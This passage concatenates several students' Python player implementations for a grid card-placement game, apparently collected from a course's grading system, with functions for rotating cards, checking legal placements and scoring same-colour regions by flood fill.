            cardsAtHand.insert(4*i+1, self.rotation(self.rotation(self.rotation(cardsAtHand[4*i]))))
        # self.hisCards = copy.deepcopy(cardsAtHand)
             
    def rotation(self,mat): #mat is list as matrix 
        rows = len(mat)
        cols = len(mat[0])

        AA = [[0]*rows for _ in range(cols)]
        
        for a in range(rows):
            for b in range(cols):
                AA[b][a] = mat[a][b]

        for a in range(int(len(AA)/2)):
            AA[a],AA[len(AA)-a-1] = AA[len(AA)-a-1],AA[a]

        return AA
    
##--------------
    def putOnTable(self, newCard):
        row = newCard[0]
        col = newCard[1]
        Rlenght = len(newCard[2])
        Clenght = len(newCard[2][0])
        
        for r in range(Rlenght):
            for c in range(Clenght):
                self.hraciDeska[r + row][c + col] = newCard[2][r][c]
                self.isFree[r + row][c + col] = False

        if row - 1 >= 0:
            for c in range(Clenght):
                if self.hraciDeska[row - 1][c + col] == 9:
                    self.hraciDeska[row - 1][c + col] = 8
                    self.edgePositions.add((row - 1, c + col))
                    self.isFree[row - 1][c + col] = True
        if row + Rlenght < self.boardRows:
            for c in range(Clenght):
                if self.hraciDeska[row + Rlenght][c + col] == 9:
                    self.hraciDeska[row + Rlenght][c + col] = 8
                    self.edgePositions.add((row + Rlenght, c + col))
                    self.isFree[row + Rlenght][c + col] = True
        if col - 1 >= 0:
            for r in range(Rlenght):
                if self.hraciDeska[r + row][col - 1] == 9:
                    self.hraciDeska[r + row][col - 1] = 8
                    self.edgePositions.add((r + row, col - 1))
                    self.isFree[r + row][col - 1] = True
        if col + Clenght < self.boardCols:
            for r in range(Rlenght):
                if self.hraciDeska[r + row][col + Clenght] == 9:
                    self.hraciDeska[r + row][col + Clenght] = 8
                    self.edgePositions.add((r + row, col + Clenght))
                    self.isFree[r + row][col + Clenght] = True


    def canBePlaced(self,newCard):
        row, col, card = newCard
        R = len(card)
        C = len(card[0])
        for r in range(R):
            for c in range(C):
                if not self.isFree[row + r][col + c]:
                    return False
        return True
    
    def Edge(self,newCard):
        row, col, card = newCard
        R = len(card)
        C = len(card[0])
        for r in range(R):
            for c in range(C):
                if (row + r, col + c) in self.edgePositions:
                    return True
        return False

    def hisHands(self,card):#Not used
        i = 0
        while card != self.hisCards[i]:
            i += 1     
        self.hisCards = self.hisCards[:i - i % 4] + self.hisCards[i - i % 4 + 4:]#deletes used card with rorations


    def floodfill_count(self,grid, x, y, visited, colour):

        stack = [(x, y)]
        maxR = len(grid)
        maxC = len(grid[0])
        count = 0

        while stack:
            cx, cy = stack.pop()

            if cx < 0 or cy < 0 or cx >= maxR or cy >= maxC:
                continue
            
            if visited[cx][cy] or grid[cx][cy] != colour:
                continue

            visited[cx][cy] = True
            count += 1

            stack.append((cx - 1, cy))
            stack.append((cx + 1, cy))
            stack.append((cx, cy - 1))
            stack.append((cx, cy + 1))

        return count


    def calculate_card_points(self,game_board, card_row, card_col, card):

        rows, cols = len(card), len(card[0])
        mat = [[0]*cols for _ in range(rows)]

        for i in range(rows):
            for j in range(cols):
                mat[i][j] = game_board[card_row + i][card_col + j]
                game_board[card_row + i][card_col + j] = card[i][j]

        visited = [[False for _ in range(len(game_board[0]))] for _ in range(len(game_board))]
        total_points = 0

        for x in range(rows):
            for y in range(cols):
                i = card_row + x
                j= card_col + y
                if not visited[i][j] and game_board[i][j] != 0:
                    total_points += self.floodfill_count(game_board, i, j, visited, game_board[i][j])

        for i in range(rows):# Back type the board
            for j in range(cols):
                game_board[card_row + i][card_col + j] = mat[i][j]
        return total_points



##--------------
    def play(self,newCardOnDesk):

        if len(self.cardsAtHand) == 0: #Do not have cards to play
            return []

        if len(newCardOnDesk) == 3: #He played something
            self.cardsOnDesk += [ newCardOnDesk ]
            self.putOnTable(newCardOnDesk)
            # self.hisHands(newCardOnDesk[2])

        if len(self.cardsOnDesk) == 0:#First move
            picked = random.randint(0, len(self.cardsAtHand)-1) #cardsAtHand[*]
            row = random.randint(0, int(self.boardRows/2))
            col = random.randint(0, int(self.boardCols/2))
            card = self.cardsAtHand[picked]
            self.putOnTable([row, col, card])
            self.cardsAtHand = self.cardsAtHand[:picked - picked % 4] + self.cardsAtHand[picked - picked % 4 + 4:]#deletes used card with rorations
            self.cardsOnDesk += [ [row, col, card ] ]
            return [row, col, card ]

        maxCa = 0
        maxR = 0
        maxC = 0
        maxVal = -1
        res = 0
        Placement = {}
        Edges = {}
        for ca in range(len(self.cardsAtHand)): #goes through every possible placement of every rotation:
            for toprow in range(self.boardRows - len(self.cardsAtHand[ca]) + 1):
                for topcol in range(self.boardCols - len(self.cardsAtHand[ca][0]) + 1):

                    if (toprow,topcol, len(self.cardsAtHand[ca]), len(self.cardsAtHand[ca][0])) not in Edges:# Is there an edge nearby?
                        if not self.Edge([toprow,topcol, self.cardsAtHand[ca]]): continue
                        else: 
                            Edges[ (toprow,topcol, len(self.cardsAtHand[ca]), len(self.cardsAtHand[ca][0]))] = True

                    if (toprow,topcol, len(self.cardsAtHand[ca]), len(self.cardsAtHand[ca][0])) not in Placement:# Does it fit?
                        if not self.canBePlaced([toprow,topcol, self.cardsAtHand[ca]]): continue
                        else: 

                            for x in range(len(self.cardsAtHand[ca]),0,-1):
                                for y in range(len(self.cardsAtHand[ca][0]),0,-1):
                                    Placement[ (toprow,topcol, x, y) ] = True
                                                                
                    # res = self.colourCount(self.hraciDeska,toprow, topcol,self.cardsAtHand[ca])
                    res = self.calculate_card_points(self.hraciDeska,toprow, topcol,self.cardsAtHand[ca])
                    if res > maxVal:
                        maxCa = ca
                        maxR = toprow
                        maxC = topcol
                        maxVal = res
        if maxVal == -1: return []

        card = self.cardsAtHand[maxCa]
        self.putOnTable([maxR, maxC, card])
        self.cardsAtHand = self.cardsAtHand[:maxCa - maxCa % 4] + self.cardsAtHand[maxCa - maxCa % 4 + 4:]#deletes used card with rorations
        self.cardsOnDesk += [ [maxR, maxC, card ] ]
        return [maxR, maxC, card ]



#--------------
if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()

    hlavao12
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/hlavao12______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

def vypis_Matice(matice):
  for radka in matice:
    for i in range(len(radka) - 1):
      print(radka[i], end=' ')
    print(radka[-1])

def tvorba_Plochy(R, C):
  plocha = []
  for _ in range(R):
    plocha.append([0]*C)
  
  return plocha

def rotace(matice):
  novaMat = []
  radek = []
  row, col = 0, -1
  for _ in range(len(matice) * len(matice[0])):
    radek.append(matice[row][col])

    if row == len(matice) - 1:
      row = 0
      novaMat.append(radek)
      radek = []

      if col == 1 - len(matice[0]):
        col = 0
      else:
        col -= 1

    else:
      row += 1

  return novaMat

def pridani_Karty_Na_Plochu(plocha, tah):
  R, C, karta = tah
  kopiePlochy = copy.deepcopy(plocha)
  for r in range(len(karta)):
    for c in range(len(karta[0])):
      rowPlochy = R + r
      colPlochy = C + c
      if karta[r][c]:
        kopiePlochy[rowPlochy][colPlochy] = karta[r][c]
      else:
        kopiePlochy[rowPlochy][colPlochy] = 9

  return kopiePlochy

def prazdny_Body(plocha):
  sousedi = [[-1, 0], [1, 0], [0, -1], [0, 1]]
  souradnice = []
  for r in range(len(plocha)):
    for c in range(len(plocha[0])):
      if not plocha[r][c]:
        for i in range(len(sousedi)):
          rNew = r+sousedi[i][0]
          cNew = c+sousedi[i][1]
          if rNew < len(plocha) and cNew < len(plocha[0]) and rNew >= 0 and cNew >= 0:
            if plocha[rNew][cNew]:
              souradnice.append([r, c])
              break
  
  return souradnice

def body_Dotyku(matice):
  top = []
  bot = []
  left = []
  right = []

  for i in range(len(matice)):
    left.append(matice[i][0])
    right.append(matice[i][len(matice[0])-1])

  for i in range(len(matice[0])):
    top.append(matice[0][i])
    bot.append(matice[len(matice)-1][i])
  
  return top, bot, left, right

def body_Pro_Lepeni_Na_Plose(kartyNaDesce):
  souradnice = []
  for karta in kartyNaDesce:
    r, c, matice = karta
    hrany = body_Dotyku(matice) #top, bot, left, right

    for i in range(len(hrany)):
      for j in range(len(hrany[i])):
        if not hrany[i][j]:
          continue
        
        match i:
          case 0:
            rUpdate = 0
            cUpdate = j
          case 1:
            rUpdate = len(matice) - 1
            cUpdate = j
          case 2:
            rUpdate = j
            cUpdate = 0
          case 3:
            rUpdate = j
            cUpdate = len(matice[0]) - 1
        
        pozice = [r + rUpdate, c + cUpdate]
        if pozice not in souradnice:
          souradnice.append(pozice)

  return souradnice

def prvni_Tah(mojeKarty):
  nejmensiKarta = None
  nejmensiVelikost = float('inf')
  indexNejmensi = 0

  for i in range(len(mojeKarty)):
    velikost = len(mojeKarty[i]) * len(mojeKarty[i][0])

    if velikost < nejmensiVelikost:
      nejmensiKarta = copy.deepcopy(mojeKarty[i])
      indexNejmensi = i
  
  return [0, 0, nejmensiKarta], indexNejmensi

def je_Polozeni_Spatne(plocha, rPolozeni, cPolozeni, matice):
  if rPolozeni < 0 or cPolozeni< 0:
    return True
  
  if rPolozeni + len(matice) > len(plocha) or cPolozeni + len(matice[0]) > len(plocha[0]):
    return True

  for row in range(len(matice)):
    for col in range(len(matice[row])):
      if plocha[rPolozeni + row][cPolozeni + col] != 0:
        return True
  
  return False

#Dostanu natocenou matici a bod kam ji prilepit
def poloz_Kartu_Na(plocha, rPolozeni, cPolozeni, matice):
  if je_Polozeni_Spatne(plocha, rPolozeni, cPolozeni, matice):
    return False

  else:
    novaPlocha = copy.deepcopy(plocha)
    for row in range(len(matice)):
      for col in range(len(matice[row])):
        novaPlocha[rPolozeni + row][cPolozeni + col] = matice[row][col]
    
    return novaPlocha

def floodfill(novaPlocha, R, C):
  delka = 0
  barva = novaPlocha[R][C]
  stack = [[R, C]]

  while stack:
    r, c = stack.pop()
    delka += 1

    novaPlocha[r][c] = 7

    okoli = [[-1,0], [0,-1], [0,1], [1,0]]

    for n in okoli:
      if not ((0 <= r+n[0]) and
              (r+n[0] < len(novaPlocha)) and
              (0 <= c+n[1]) and
              (c+n[1] < len(novaPlocha[0]))):
        continue

      if (novaPlocha[r+n[0]][c+n[1]] == barva):
        stack.append([r+n[0], c+n[1]])
  
  return delka

def delka_Cesty(novaPlocha, hrany, rPolozeni, cPolozeni, matice):
  delka = 0
  
  for hrana in range(len(hrany)):
    for bod in range(len(hrany[hrana])):
      if hrany[hrana][bod] != 0:
        match hrana:
          case 0:
            rSouseda = rPolozeni - 1
            cSouseda = cPolozeni + bod
          case 1:
            rSouseda = rPolozeni + len(matice)
            cSouseda = cPolozeni + bod
          case 2:
            rSouseda = rPolozeni + bod
            cSouseda = cPolozeni - 1
          case 3:
            rSouseda = rPolozeni + bod
            cSouseda = cPolozeni + len(matice[0])

        if rSouseda >= len(novaPlocha) or cSouseda >= len(novaPlocha[0]):
          continue

        if rSouseda < 0 or cSouseda < 0:
          continue

        if novaPlocha[rSouseda][cSouseda] == hrany[hrana][bod]:
          delka += floodfill(novaPlocha, rSouseda, cSouseda)

  return delka

def lepeni_Karty(karta, plocha, souradnice, podminka):
  maxDelkaKarty = -1
  rVys, cVys = -1, -1
  nejMaticeKarty = None
  matice = copy.deepcopy(karta)

  for i in range(len(souradnice)):
    sousedi = [[-1, 0], [1, 0], [0, -1], [0, 1]]
    for j in range(len(sousedi)):
      for _ in range(4):
        matice = rotace(matice)
        hrany = body_Dotyku(matice)
        r, c = souradnice[i]
        if podminka:
          rNew = r
          cNew = c
        else:
          rNew = r + sousedi[j][0]
          cNew = c + sousedi[j][1]
        
        for hrana in range(len(hrany)):
          for bod in range(len(hrany[hrana])):

            if hrany[hrana][bod] == plocha[r][c] and (podminka or hrany[hrana][bod] != 0):
              #bod na matici ktery budu lepit
              match hrana:
                case 0:
                  rMatice = 0
                  cMatice = bod
                case 1:
                  rMatice = len(matice) - 1
                  cMatice = bod
                case 2:
                  rMatice = bod
                  cMatice = 0
                case 3:
                  rMatice = bod
                  cMatice = len(matice[0]) - 1

              rPolozeni = rNew - rMatice
              cPolozeni = cNew - cMatice
              novaPlocha = poloz_Kartu_Na(plocha, rPolozeni, cPolozeni, matice)
              if novaPlocha:
                delka = delka_Cesty(novaPlocha, hrany, rPolozeni, cPolozeni, matice)
                if delka > maxDelkaKarty:
                  maxDelkaKarty = delka
                  rVys, cVys = rPolozeni, cPolozeni
                  nejMaticeKarty = copy.deepcopy(matice)
  
  return rVys, cVys, maxDelkaKarty, nejMaticeKarty

def nejdelsi_Karta(plocha, hraciKarty, souradnice):
  nejIndex = 0
  maxDelka = -1
  rFin, cFin = -1, -1
  finMatice = None
  for i in range(len(hraciKarty)):
    rVys, cVys, maxDelkaKarty, nejMaticeKarty = lepeni_Karty(hraciKarty[i], plocha, souradnice, False)

    if maxDelkaKarty > maxDelka:
      nejIndex = i
      maxDelka = maxDelkaKarty
      rFin, cFin = rVys, cVys
      finMatice = copy.deepcopy(nejMaticeKarty)

  if finMatice:
    vysledek =[rFin, cFin, finMatice]
  
    return vysledek, nejIndex
  
  else:
    return False, nejIndex

def polozeni_Nulove_Karty(plocha, hraciKarty, souradnice):
  finMatice = None
  for i in range(len(hraciKarty)):
    r, c, delka, finMatice = lepeni_Karty(hraciKarty[i], plocha, souradnice, True)
        
    if finMatice:
      return [r, c, finMatice], i
  
  else:
    return [], 0

class Player(BASE.BasePlayer):
  def __init__(self, login, boardRows, boardCols, cardsAtHand):
    super().__init__(login, boardRows, boardCols, cardsAtHand)
    self.playerName = "My awesome player"

    self.plocha = tvorba_Plochy(self.boardRows, self.boardCols)
    self.prvniTah = True
    self.polozenyKarty = []
        

  def play(self,newCardOnDesk):
    if not self.cardsAtHand:
      return []
    
    mujTah = []
    
    if self.prvniTah and not newCardOnDesk:
      mujTah, indexKarty = prvni_Tah(self.cardsAtHand)
      self.polozenyKarty.append(mujTah)
      self.cardsAtHand.pop(indexKarty)
      self.prvniTah = False
      self.plocha = pridani_Karty_Na_Plochu(self.plocha, mujTah)
      return mujTah

    if newCardOnDesk:
      self.plocha = pridani_Karty_Na_Plochu(self.plocha, newCardOnDesk)
      self.polozenyKarty.append(newCardOnDesk)

    souradnice = body_Pro_Lepeni_Na_Plose(self.polozenyKarty)
    mujTah, indexKarty = nejdelsi_Karta(self.plocha, self.cardsAtHand, souradnice)

    if mujTah:
      self.prvniTah = False
      self.polozenyKarty.append(mujTah)
      self.plocha = pridani_Karty_Na_Plochu(self.plocha, mujTah)
      self.polozenyKarty.append(mujTah)
      self.cardsAtHand.pop(indexKarty)
      return mujTah
    
    else:
      prazdneBody = prazdny_Body(self.plocha)
      mujTah, indexKarty = polozeni_Nulove_Karty(self.plocha, self.cardsAtHand, prazdneBody)

      if mujTah:
        self.prvniTah = False
        self.polozenyKarty.append(mujTah)
        self.plocha = pridani_Karty_Na_Plochu(self.plocha, mujTah)
        self.polozenyKarty.append(mujTah)
        self.cardsAtHand.pop(indexKarty)
        return mujTah
      
      else:
        return []


if __name__ == "__main__":
  """ when you run:
      python3 player.py

      you should get set of .png files with the progress of the game
  """

  tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

  p1 = Player("testA", 19, 23, tmp)
  p2 = Player("testB", 19, 23, tmp)

  p2move = []
  gameStep = 0
  while True:
    p1move = p1.play(p2move)
    print("p1 returned", p1move)
    p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

    p2move = p2.play(p1move)    
    print("p2 returned", p2move)
    p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
    gameStep += 1
    if p1move == [] and p2move == []:
      print("end of game")
      quit()


    krausto8
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/krausto8______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


EMPTY = -1
BLANK = 0


class Card:
    def __init__(self, R, C, cells, x=-1, y=-1) -> None:
        self.R = R
        self.C = C
        self.cells = cells
        self.x = x
        self.y = y
        self.cardHash = hash(str(cells))
        self.type = (R, C)

    def get(self, x, y):
        return self.cells[x][y]

    def __str__(self) -> str:
        temp = f"{self.R}x{self.C} at ({self.x},{self.y})"
        for row in self.cells:
            temp += f"\n{' | '.join(str(x) for x in row)}"
        return temp

    def rotLeft(self):
        newcells = [
            [self.cells[j][i] for j in range(self.R)] for i in range(self.C - 1, -1, -1)
        ]
        return Card(self.C, self.R, newcells, self.x, self.y)

    def isOutside(self, x, y):
        return x < self.x or x >= self.x + self.R or y < self.y or y >= self.y + self.C


class Board:
    def __init__(self, HEIGHT, WIDTH) -> None:
        self.HEIGHT = HEIGHT
        self.WIDTH = WIDTH
        self.isEmpty = True
        self.board = [[EMPTY for _ in range(WIDTH)] for _ in range(HEIGHT)]
        self.touchPos = set()
        self.directions = [(-1, 0), (0, 1), (1, 0), (0, -1)]
        self.componentScore = [[0 for _ in range(WIDTH)] for _ in range(HEIGHT)]

    def __str__(self) -> str:
        res = ""
        res += "----" * (self.WIDTH + 1)
        res += "\n   | "
        res += " | ".join(str(x) for x in range(0, self.WIDTH))
        res += "\n"
        res += "----" * (self.WIDTH + 1)
        res += "\n"
        for i, row in enumerate(self.board, 0):
            res += f"{i:2} | "
            res += " | ".join(f"{v}" if v != EMPTY else "_" for v in row)
            res += "\n"
        res += "----" * (self.WIDTH + 1)
        return res

    def addCardToBoard(self, card, pos):
        for i in range(card.R):
            for j in range(card.C):
                self.board[i + pos[0]][j + pos[1]] = card.get(i, j)

    def removeCardFromBoard(self, card, pos):
        for i in range(card.R):
            for j in range(card.C):
                self.board[i + pos[0]][j + pos[1]] = EMPTY

    def isOnBoard(self, pos):
        return 0 <= pos[0] < self.HEIGHT and 0 <= pos[1] < self.WIDTH

    def updateTouch(self, card, x, y):
        for i, row in enumerate(card.cells):
            for j, _ in enumerate(row):
                self.touchPos.discard((x + i, y + j))

        if x > 2:
            self.touchPos.update([(x - 1, k) for k in range(y, y + card.C)])
        if y > 2:
            self.touchPos.update([(k, y - 1) for k in range(x, x + card.R)])

        if x < self.HEIGHT - 2:
            self.touchPos.update([(x + card.R, k) for k in range(y, y + card.C)])
        if y < self.WIDTH - 2:
            self.touchPos.update([(k, y + card.C) for k in range(x, x + card.R)])

    def isValidPos(self, card, x, y):
        if x + card.R - 1 >= self.HEIGHT or y + card.C - 1 >= self.WIDTH:
            return False

        for i in range(x, x + card.R):
            for j in range(y, y + card.C):
                if self.board[i][j] != EMPTY:
                    return False

        return True

    def getPossiblePositions(self, card):
        possible = set()
        for x, y in self.touchPos:
            for i in range(max(0, x - card.R + 1), min(x + 1, self.HEIGHT)):
                for j in range(max(0, y - card.C + 1), min(y + 1, self.WIDTH)):
                    if (i, j) not in possible and self.isValidPos(card, i, j):
                        possible.add((i, j))
        return possible

    def bfs(self, visited, start, card: Card):
        queue = []
        queue.append(start)
        score = 0
        valid = False
        enter = None

        while queue:
            cx, cy = queue.pop(0)
            if visited[cx][cy]:
                continue

            visited[cx][cy] = True
            valid = valid or card.isOutside(cx, cy)

            score += 1

            for dir in self.directions:
                newx, newy = cx + dir[0], cy + dir[1]
                if (
                    self.isOnBoard((newx, newy))
                    and not visited[newx][newy]
                    and self.board[newx][newy] == self.board[cx][cy]
                ):
                    queue.append((cx + dir[0], cy + dir[1]))

        return score if valid else 0

    def calculateCost(self, card: Card, position):
        self.addCardToBoard(card, position)

        cost = 0
        visited = [[False for _ in range(self.WIDTH)] for _ in range(self.HEIGHT)]
        for x in range(position[0], position[0] + card.R):
            for y in range(position[1], position[1] + card.C):
                if not visited[x][y] and self.board[x][y] != BLANK:
                    cost += self.bfs(visited, (x, y), card)

        self.removeCardFromBoard(card, position)
        return cost


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Strejda 'Kouzelna ruka' Milan"
        self.myResult = 0
        self.myBoard = Board(boardRows, boardCols)
        self.cardTypes = {}
        self.myCards = []
        self.opCards = []
        self.usedMyCards = [False for _ in range(len(cardsAtHand))]
        self.usedOpCards = [False for _ in range(len(cardsAtHand))]

        for card in cardsAtHand:
            myCard = [Card(len(card), len(card[0]), card)]
            opCard = [Card(len(card), len(card[0]), card)]
            for _ in range(3):
                rotMyCard = myCard[-1].rotLeft()
                rotOpCard = opCard[-1].rotLeft()
                myCard.append(rotMyCard)
                opCard.append(rotOpCard)
            self.myCards.append(myCard)
            self.opCards.append(opCard)

    def findOpCardIndex(self, cells):
        for i, cardRotations in enumerate(self.opCards):
            for j, rot in enumerate(cardRotations):
                if rot.cardHash == hash(str(cells)):
                    return i, j
        return -1, -1
    
        

    def findStartingCard(self):
        card = self.myCards[0][0]
        size = card.R * card.C
        resI = 0
        for i, cardRotations in enumerate(self.myCards):
            temp = cardRotations[0]
            tempSize = temp.R * temp.C
            if tempSize > size:
                card = temp
                size = tempSize
                resI = i
        return card, resI, 0

    def getPossiblePositions(self, card):
        if card.type in self.cardTypes:
            return self.cardTypes[card.type]
        else:
            possible = self.myBoard.getPossiblePositions(card)
            self.cardTypes[card.type] = possible
            return possible
        
    def getDistanceFromMiddle(self, pos):
        return ((self.boardRows // 2 - pos[0]) ** 2 + (self.boardCols // 2 - pos[1]) ** 2)

    def findClosestToMiddle(self, results):
        closestIndex = 0
        bestDistance = self.boardCols * self.boardRows
        for index, (i, j, card, pos, result) in enumerate(results):
            dist = self.getDistanceFromMiddle(pos) 
            if dist < bestDistance:
                closestIndex = index
                bestDistance = dist
            
        return results[closestIndex]
        
    def findBestCard(self):
        results = []
        result = -1

        for i, cardRots in enumerate(self.myCards):
            if self.usedMyCards[i]:
                continue

            for j, card in enumerate(cardRots):
                possible = self.getPossiblePositions(card)

                for pos in possible:
                    card.x, card.y = pos[0], pos[1]
                    cost = self.myBoard.calculateCost(card, pos)
                    if cost > result:
                        result = cost
                        results = [(i, j, card, pos, result)]
                    elif cost == result:
                        results.append((i, j, card, pos, result))
        # return random.choice(results)
        if results:
            return self.findClosestToMiddle(results)
        else:
            return (-1, -1, None, None, None)

    def putCardOnBoard(self, cardI, cardJ, x, y, op=True):
        card = None
        if op:
            card = self.opCards[cardI][cardJ]
            self.usedOpCards[cardI] = True
        else:
            card = self.myCards[cardI][cardJ]
            self.usedMyCards[cardI] = True

        self.cardsOnDesk.append([x, y, card.cells])

        self.myBoard.isEmpty = False
        self.myBoard.updateTouch(card, x, y)
        self.myBoard.addCardToBoard(card, (x, y))

    def play(self, newCardOnDesk):
        """this method is called during the game.
        The input argument newCardOnDesk is:
        - [] if other player didn't place any card in his move), or
        - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board

        Return value:
        - [ row, col, cardMatrix ] if you want to place a card, or
        - [] if no card can be placed
        """

        if len(newCardOnDesk) == 3:
            i, j = self.findOpCardIndex(newCardOnDesk[2])
            self.putCardOnBoard(i, j, newCardOnDesk[0], newCardOnDesk[1])

        if self.myBoard.isEmpty:
            card, i, j = self.findStartingCard()
            x, y = (
                self.myBoard.HEIGHT // 2 - card.R // 2,
                self.myBoard.WIDTH // 2 - card.C // 2,
            )
            self.putCardOnBoard(i, j, x, y, False)
            return [x, y, card.cells]

        for used in self.usedMyCards:
            if not used:
                break
        else:
            return []

        self.cardTypes.clear()

        resCardI, resCardJ, resCard, resultPos, result = self.findBestCard()

        if resCard:
            self.myResult += result
            self.putCardOnBoard(resCardI, resCardJ, resultPos[0], resultPos[1], False)
            return [resultPos[0], resultPos[1], resCard.cells]
        else:
            return []


# basic cards with colors 1 and 2
# note that Brute can provide you also other cards!
C44a = [[0, 1, 2, 0], [1, 1, 2, 2], [2, 2, 1, 1], [0, 2, 1, 0]]

C44b = [[0, 0, 1, 0], [1, 1, 1, 0], [0, 2, 2, 2], [0, 2, 0, 0]]

C53b = [[0, 1, 0], [0, 1, 0], [0, 1, 0], [0, 1, 1], [0, 0, 0]]

C53c = [[0, 1, 0], [0, 1, 0], [0, 1, 1], [0, 2, 2], [0, 2, 0]]

C33a = [[0, 1, 0], [1, 1, 2], [0, 0, 2]]

C33c = [[1, 2, 1], [2, 2, 2], [1, 2, 1]]

if __name__ == "__main__":
    """when you run:
    python3 player.py

    you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a, C33c, C53c, C53b] * 1
    # tmp = [C44a] * 1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(
            p1.boardRows,
            p1.boardCols,
            p1.cardsOnDesk,
            "move-{:02}b-A.png".format(gameStep),
        )

        p2move = p2.play(p1move)
        print("p2 returned", p2move)
        p2.drawCards(
            p2.boardRows,
            p2.boardCols,
            p2.cardsOnDesk,
            "move-{:02}b-B.png".format(gameStep),
        )
        gameStep += 1
        # break
        if p1move == [] and p2move == []:
            print("end of game")
            print("p1: ", p1.myResult)
            print("p2: ", p2.myResult)
            quit()
    kovarad2
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/kovarad2______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw
  
def initializeMatrix(dimensions, inside=0): # dimensions = [radky, sloupce]
    matrix = []
    for i in range(dimensions[0]):
        matrix.append([])
        for j in range(dimensions[1]):
            matrix[i].append(inside)
    return matrix
  
def printMatrix(matrix): # matrix je 2D list
    for i in range(len(matrix)):
        for j in range(len(matrix[i])):
            print(matrix[i][j], end=' ')
        print()
  
def fillMatrix(matrix, fillment): # matrix je 2D list, fillment je list
    x = 0
    for i in range(len(matrix)):
        for j in range(len(matrix[i])):
            matrix[i][j] = fillment[x]
            x += 1
    return matrix
  
def serializeMatrix(matrix):
    serializedMatrix = []
    for i in range(len(matrix)):
        for j in range(len(matrix[0])):
            serializedMatrix.append(matrix[i][j])
  
    return serializedMatrix
  
def decomposeInput(programInput):
    board = Board(programInput[0][0], programInput[0][1])
    cardsToPlace = []
  
    for i in range(programInput[1][0]):
        card = Card(programInput[i+2][2], programInput[i+2][3], programInput[i+2][4:])
        board.force_placeCard(card, programInput[i+2][0],programInput[i+2][1])
  
    for i in range(programInput[1][1]):
        cardIndex = i+2+programInput[1][0]
        card = Card(programInput[cardIndex][0], programInput[cardIndex][1], programInput[cardIndex][2:])
        cardsToPlace.append(card)
  
    return board, cardsToPlace
  
def findLargestCardDimensions(placableCards):
    maxHeight = 0
    maxWidth = 0
    for card in placableCards:
        maxHeight = max(maxHeight, card.height)
        maxWidth = max(maxWidth, card.width)
    return max(maxHeight, maxWidth)
 
 
class Board:
    def __init__(self, height, width):
        self.height = height
        self.width = width
        self.board = initializeMatrix([height, width])
        self.N_positions_list = []
    
    def draw(self):
        printMatrix(self.board)
  
    def force_placeCard(self, cardToPlace, x, y):
        for i in range(cardToPlace.height):
            for j in range(cardToPlace.width):
                if cardToPlace.matrixForm[i][j] == 0:
                    self.board[x + i][y + j] = 'X'
                    self.placeablePositionsForm[x + i][y + j] = 'X'
                else:
                    self.board[x + i][y + j] = cardToPlace.matrixForm[i][j]
                    self.placeablePositionsForm[x + i][y + j] = cardToPlace.matrixForm[i][j]

    def placeCard(self, cardToPlace, x, y):
        is_legal = True
        placed_indexes = []
        if self.height < x + cardToPlace.height or self.width < y + cardToPlace.width:
            return False
        for i in range(cardToPlace.height):
            if not is_legal:
                break
            for j in range(cardToPlace.width):
                if self.placeablePositionsForm[x + i][y + j] != 'N':
                    is_legal = False
                    break
                if cardToPlace.matrixForm[i][j] == 0:
                    self.board[x + i][y + j] = 'X'
                    placed_indexes.append([x+i,y+j])
                else:
                    self.board[x + i][y + j] = cardToPlace.matrixForm[i][j]
                    placed_indexes.append([x+i,y+j])
        if not is_legal:
            for coord in placed_indexes:
                x = coord[0]
                y = coord[1]
                self.board[x][y] = 0
            return False
        else:
            return True
 
    def unplaceCard(self, placedCard, x, y):
        for i in range(placedCard.height):
            for j in range(placedCard.width):
                self.board[x + i][y + j] = 0
 
    def initialize_cardForm(self):
        self.cardForm = initializeMatrix([self.height,self.width])

    def update_CardForm(self):
        for i in range(self.height):
            for j in range(self.width):
                if self.board[i][j] == 0:
                    continue
                else:
                    self.cardForm[i][j] = 'C'
  
    def initialze_placeablePositionBoard(self):
        self.placeablePositionsForm = copy.deepcopy(self.board)

    def update_placeabelPositionsForm(self, maxSize):
        floodFillHelp = []
        
        checkedTiles = []
        maxSize -= 1
        for i in range(self.height):
            for j in range(self.width):
